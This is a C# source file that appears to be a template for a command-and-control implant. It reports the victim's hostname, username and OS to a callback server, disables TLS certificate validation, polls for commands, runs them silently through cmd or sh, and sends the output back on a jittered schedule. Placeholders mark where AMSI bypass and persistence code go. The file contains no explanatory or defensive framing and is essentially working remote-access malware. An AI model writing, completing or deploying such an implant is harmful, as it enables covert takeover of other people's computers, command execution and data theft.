// IB Agent — C#
using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Diagnostics;
using System.Threading;

class Agent {
    const string CB = "[CALLBACK]";
    const int FREQ = [FREQ];
    const int JITTER = [JITTER];
    const int RETRY_MAX = [RETRY_MAX];
    const string LABEL = "[LABEL]";

    static readonly Random _rng = new Random();

    static void Main() {
        [PROXY_SETUP]
        [AMSI_BYPASS]
        var handler = new HttpClientHandler();
        handler.ServerCertificateCustomValidationCallback = (m, c, ch, e) => true;
        var http = new HttpClient(handler);

        string hname = Environment.MachineName;
        string uname = Environment.UserName;
        string osInfo = $"{Environment.OSVersion} {(Environment.Is64BitOperatingSystem ? "x64" : "x86")}";

        var checkin = JsonSerializer.Serialize(new { hostname = hname, username = uname, os_info = osInfo, script = LABEL });
        var resp = http.PostAsync($"{CB}/agent/checkin", new StringContent(checkin, Encoding.UTF8, "application/json")).Result;
        var body = resp.Content.ReadAsStringAsync().Result;
        var doc = JsonDocument.Parse(body);
        string agentId = doc.RootElement.GetProperty("agent_id").GetString();
        if (string.IsNullOrEmpty(agentId)) return;
        [PERSIST_CODE]
        int _backoff = 1;
        while (true) {
            [KILLDATE_CHECK]
            try {
                var r = http.GetAsync($"{CB}/agent/cmd/{agentId}").Result;
                if (r.StatusCode == HttpStatusCode.OK) {
                    _backoff = 1;
                    var cmdBody = r.Content.ReadAsStringAsync().Result;
                    var cmdDoc = JsonDocument.Parse(cmdBody);
                    string cmdId = cmdDoc.RootElement.GetProperty("id").ToString();
                    string command = cmdDoc.RootElement.GetProperty("command").GetString();
                    string output;
                    try {
                        var isWin = Environment.OSVersion.Platform == PlatformID.Win32NT;
                        var psi = new ProcessStartInfo(isWin ? "cmd" : "sh", (isWin ? "/c " : "-c ") + command);
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        var p = Process.Start(psi);
                        output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                        p.WaitForExit(300000);
                    } catch (Exception ex) { output = ex.Message; }
                    http.PostAsync($"{CB}/agent/res/{cmdId}", new StringContent(output, Encoding.UTF8, "text/plain")).Wait();
                }
            } catch {
                if (RETRY_MAX > 1 && _backoff < RETRY_MAX) _backoff++;
            }
            double s = FREQ * _backoff;
            if (JITTER > 0) s *= 1 + (_rng.NextDouble() * 2 - 1) * JITTER / 100.0;
            Thread.Sleep((int)(Math.Max(1, s) * 1000));
        }
    }
}
